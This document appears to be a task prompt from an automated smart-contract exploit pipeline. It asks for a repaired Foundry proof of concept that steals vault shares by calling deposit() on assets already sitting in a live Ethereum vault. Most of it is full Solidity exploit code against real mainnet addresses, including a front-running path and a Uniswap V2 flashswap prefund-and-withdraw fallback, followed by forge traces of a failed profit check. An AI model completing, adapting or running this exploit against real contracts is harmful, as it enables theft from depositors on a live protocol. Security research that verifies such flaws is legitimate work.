You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can mint vault shares using assets already sitting in the vault
- claim: `deposit` never pulls assets from `msg.sender`. It only checks that the vault already holds at least `assets`, forwards those pre-existing funds to the controller, and then mints shares to an arbitrary `receiver`.
- impact: A caller can steal credit for someone else's prefunded deposit or claim any tokens/ETH accidentally sent to the vault, receiving newly minted shares without contributing assets.
- exploit_paths: ["A victim transfers underlying tokens or ETH to the vault address before calling `deposit`, because the vault has no `transferFrom` step.", "An attacker sees the prefunded balance and calls `deposit(victimAmount, attacker)` first.", "The vault forwards the victim-funded assets to the controller and mints the corresponding vault shares to the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWhitelistLike {
    function listed(address account) external returns (bool);
}

interface IEFVaultLike {
    function asset() external view returns (address);
    function whiteList() external view returns (address);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xBDB515028A6fA6CD1634B5A9651184494aBfD336;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant UNISWAP_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 internal constant STATUS_UNTRIED = 0;
    uint256 internal constant STATUS_SUCCESS = 1;
    uint256 internal constant STATUS_NOT_WHITELISTED = 2;
    uint256 internal constant STATUS_DEPOSIT_FAILED = 3;
    uint256 internal constant STATUS_NO_SHARES = 4;
    uint256 internal constant STATUS_FLASHSWAP_FAILED = 5;
    uint256 internal constant STATUS_WITHDRAW_FAILED = 6;

    uint256 public status;
    bytes public lastError;

    uint256 private _flashBorrowAmount;

    constructor() {}

    receive() external payable {}

    // The user-facing gain for this finding is the illegitimately minted vault share token itself.
    // Returning the vault token address from the start keeps the profit token stable across pre/post
    // harness reads, and the measured profit becomes the net share balance delta on this verifier.
    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return IERC20Like(TARGET).balanceOf(address(this));
    }

    function executeOnOpportunity() external {
        IEFVaultLike vault = IEFVaultLike(TARGET);
        address assetToken = vault.asset();

        status = STATUS_UNTRIED;
        delete lastError;

        // The harness calls through this verifier contract, so onlyAllowed can only pass if this
        // contract is accepted by the live whitelist at the fork block.
        if (!_isWhitelisted(vault.whiteList(), address(this))) {
            status = STATUS_NOT_WHITELISTED;
            return;
        }

        // exploit_paths[0]: a victim can transfer underlying tokens or ETH directly to the vault
        // before calling `deposit`, because the vault path shown in the finding has no
        // `transferFrom` pull from `msg.sender`.
        //
        // exploit_paths[1]: an attacker then sees the prefunded vault balance and calls
        // `deposit(victimAmount, attacker)` first. In this verifier the attacker is `address(this)`,
        // so the concrete call becomes `deposit(stealAmount, address(this))`.
        //
        // exploit_paths[2]: the vault forwards those already-sitting assets to its controller and
        // mints the corresponding vault shares to the attacker-controlled receiver without the
        // attacker contributing fresh assets.
        _stealExistingPrefund(vault, assetToken);
        if (vault.balanceOf(address(this)) > 0) {
            status = STATUS_SUCCESS;
            return;
        }

        // Fallback for this fork: when no idle vault balance exists, source a temporary same-tx prefund
        // with a public Uniswap V2 flashswap. The core causality is unchanged:
        // 1. assets are placed into the vault first,
        // 2. deposit() is called afterwards,
        // 3. the vault still mints shares without pulling from msg.sender.
        // Any retained shares after deterministic repayment are the exploit profit.
        if (assetToken == USDC) {
            _attemptFlashswapPrefund(vault);
        }

        if (vault.balanceOf(address(this)) > 0) {
            status = STATUS_SUCCESS;
        } else if (status == STATUS_UNTRIED) {
            status = STATUS_NO_SHARES;
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == UNISWAP_V2_USDC_WETH, "invalid-pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _flashBorrowAmount && borrowed > 0, "invalid-borrow");

        IEFVaultLike vault = IEFVaultLike(TARGET);

        // Funding variation for the same root cause: make USDC sit in the vault first so the later
        // `deposit(borrowed, address(this))` still claims credit for assets already present there.
        _safeTransfer(USDC, TARGET, borrowed);

        uint256 sharesBefore = vault.balanceOf(address(this));
        try vault.deposit(borrowed, address(this)) returns (uint256) {
            uint256 minted = vault.balanceOf(address(this)) - sharesBefore;
            require(minted > 0, "no-minted-shares");
        } catch (bytes memory err) {
            lastError = err;
            revert("deposit-failed");
        }

        // Deterministic Uniswap V2 repayment in the same token.
        uint256 repayAmount = _sameTokenFlashRepayAmount(borrowed);
        if (IERC20Like(USDC).balanceOf(address(this)) < repayAmount) {
            bool ok = _withdrawAssetsForRepayment(vault, repayAmount - IERC20Like(USDC).balanceOf(address(this)));
            require(ok, "repay-withdraw-failed");
        }

        _safeTransfer(USDC, UNISWAP_V2_USDC_WETH, repayAmount);
        _flashBorrowAmount = 0;
    }

    function _stealExistingPrefund(IEFVaultLike vault, address assetToken) internal {
        uint256 maxDeposit = vault.maxDeposit();

        for (uint256 i = 0; i < 8; ++i) {
            uint256 prefundedBalance = _vaultAssetBalance(assetToken);
            if (prefundedBalance == 0) {
                return;
            }

            uint256 stealAmount = prefundedBalance;
            if (stealAmount > maxDeposit) {
                stealAmount = maxDeposit;
            }
            if (stealAmount == 0) {
                return;
            }

            uint256 sharesBefore = vault.balanceOf(address(this));
            // exploit_paths[1]: call `deposit(victimAmount, attacker)` after observing the
            // prefunded balance. Here `stealAmount` is bounded by the assets already sitting in the
            // vault, and the attacker receiver is `address(this)`.
            try vault.deposit(stealAmount, address(this)) returns (uint256) {
                if (vault.balanceOf(address(this)) <= sharesBefore) {
                    status = STATUS_NO_SHARES;
                    return;
                }
            } catch (bytes memory err) {
                status = STATUS_DEPOSIT_FAILED;
                lastError = err;
                return;
            }
        }
    }

    function _attemptFlashswapPrefund(IEFVaultLike vault) internal {
        IUniswapV2PairLike pair = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH);
        if (pair.token0() != USDC && pair.token1() != USDC) {
            status = STATUS_FLASHSWAP_FAILED;
            return;
        }

        // Keep the borrow size modest so a single withdraw path can repay it even if controller-side
        // withdraw caps or fees exist. The exploit still demonstrates the same root cause because the
        // vault mints shares against funds that were merely placed into the vault beforehand.
        uint256 borrowAmount = 1_000_000e6;
        uint256 maxDeposit = vault.maxDeposit();
        if (borrowAmount > maxDeposit) {
            borrowAmount = maxDeposit;
        }
        if (borrowAmount == 0) {
            status = STATUS_FLASHSWAP_FAILED;
            return;
        }

        _flashBorrowAmount = borrowAmount;

        bool usdcIsToken0 = pair.token0() == USDC;
        (bool ok, bytes memory err) = UNISWAP_V2_USDC_WETH.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                usdcIsToken0 ? borrowAmount : 0,
                usdcIsToken0 ? 0 : borrowAmount,
                address(this),
                bytes("flash-prefund")
            )
        );

        if (!ok) {
            status = STATUS_FLASHSWAP_FAILED;
            lastError = err;
            _flashBorrowAmount = 0;
            return;
        }

        if (vault.balanceOf(address(this)) == 0) {
            status = STATUS_NO_SHARES;
        }
    }

    function _withdrawAssetsForRepayment(IEFVaultLike vault, uint256 assetsNeeded) internal returns (bool) {
        uint256 maxWithdraw = vault.maxWithdraw();
        if (maxWithdraw == 0) {
            status = STATUS_WITHDRAW_FAILED;
            return false;
        }

        uint256 targetBalance = IERC20Like(USDC).balanceOf(address(this)) + assetsNeeded;

        for (uint256 i = 0; i < 16; ++i) {
            if (IERC20Like(USDC).balanceOf(address(this)) >= targetBalance) {
                return true;
            }

            uint256 shareBalance = vault.balanceOf(address(this));
            if (shareBalance == 0) {
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }

            uint256 remainingAssets = targetBalance - IERC20Like(USDC).balanceOf(address(this));
            uint256 claimableAssets = vault.convertToAssets(shareBalance);
            if (claimableAssets == 0) {
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }

            uint256 chunk = remainingAssets;
            if (chunk > claimableAssets) {
                chunk = claimableAssets;
            }
            if (chunk > maxWithdraw) {
                chunk = maxWithdraw;
            }

            try vault.withdraw(chunk, address(this)) returns (uint256) {
                // controller-side fees can make each chunk short, so loop until the balance target is met
            } catch (bytes memory err) {
                lastError = err;
                status = STATUS_WITHDRAW_FAILED;
                return false;
            }
        }

        status = STATUS_WITHDRAW_FAILED;
        return IERC20Like(USDC).balanceOf(address(this)) >= targetBalance;
    }

    function _vaultAssetBalance(address assetToken) internal view returns (uint256) {
        if (assetToken == address(0)) {
            return TARGET.balance;
        }
        return IERC20Like(assetToken).balanceOf(TARGET);
    }

    function _isWhitelisted(address whitelist, address account) internal returns (bool) {
        if (whitelist == address(0)) {
            return false;
        }

        try IWhitelistLike(whitelist).listed(account) returns (bool allowed) {
            return allowed;
        } catch {
            return false;
        }
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.63s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 82677)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xBDB515028A6fA6CD1634B5A9651184494aBfD336
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 2141

Traces:
  [82677] FlawVerifierTest::testExploit()
    ├─ [270] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336
    ├─ [9962] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [2631] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [32137] FlawVerifier::executeOnOpportunity()
    │   ├─ [3233] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::asset() [staticcall]
    │   │   ├─ [2405] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::asset() [delegatecall]
    │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [3211] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::whiteList() [staticcall]
    │   │   ├─ [2383] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::whiteList() [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [270] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336
    ├─ [2126] FlawVerifier::profitAmount() [staticcall]
    │   ├─ [1462] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [631] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [1462] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [631] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xBDB515028A6fA6CD1634B5A9651184494aBfD336)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16696239 [1.669e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2141)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 142.88ms (61.88ms CPU time)

Ran 1 test suite in 163.87ms (142.88ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 82677)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
